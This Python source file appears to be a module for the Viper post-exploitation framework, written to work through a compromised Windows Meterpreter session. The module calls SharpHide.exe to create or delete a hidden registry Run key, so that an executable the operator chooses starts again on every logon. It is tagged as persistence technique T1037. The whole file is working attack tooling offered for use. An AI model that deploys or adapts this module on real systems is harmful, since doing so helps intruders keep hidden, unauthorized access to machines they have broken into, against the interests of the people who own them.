# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "Windows注册表Run键值持久化(C#)"
    DESC_ZH = "模块通过调用SharpHide.exe写入隐藏的注册表键值,实现持久化.\n" \
              "SharpHide.exe会将目标exe路径写入到注册表Run键值中.\n"

    NAME_EN = "Windows registry Run key persistence (C#)"
    DESC_EN = "The module realizes persistence by calling Sharphide.exe to write hidden registry keys.\n" \
              "SharpHide.exe will write the target exe path into the registry Run key.\n"

    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1037"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/npl2d8"]
    REFERENCES = ["https://github.com/outflanknl/SharpHide"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionEnum(name='action',
                   tag_zh="执行动作",
                   desc_zh="针对键值的执行的命令",
                   tag_en="Action", desc_en="Action",
                   required=True,
                   enum_list=[
                       {'tag_zh': "创建", 'tag_en': "Create", 'value': "create"},
                       {'tag_zh': "删除", 'tag_en': "Delete", 'value': "delete"},
                   ],
                   length=6),
        OptionStr(name='keyvalue',
                  tag_zh="可执行文件目录",
                  desc_zh="输入开启启动的exe文件路径.",
                  tag_en="Exe file directory", desc_en="Enter the path of the exe file to start.",
                  required=True,
                  length=18),
        OptionStr(name='arguments',
                  tag_zh="命令行参数", required=False,
                  desc_zh="执行exe是的命令行参数",
                  tag_en="Command line parameters", desc_en="Command line parameters for executing exe",
                  length=24),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"
        self.set_assembly("SharpHide")
        if self.param("action") == "delete":
            self.set_arguments("action=delete")
        else:
            param_keyvalue = self.param("keyvalue")
            arguments = f"action=create keyvalue='{param_keyvalue}'"

            param_arguments = self.param("arguments")
            if param_arguments is not None:
                arguments += f" arguments='{param_arguments}'"
            self.set_arguments(arguments)
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
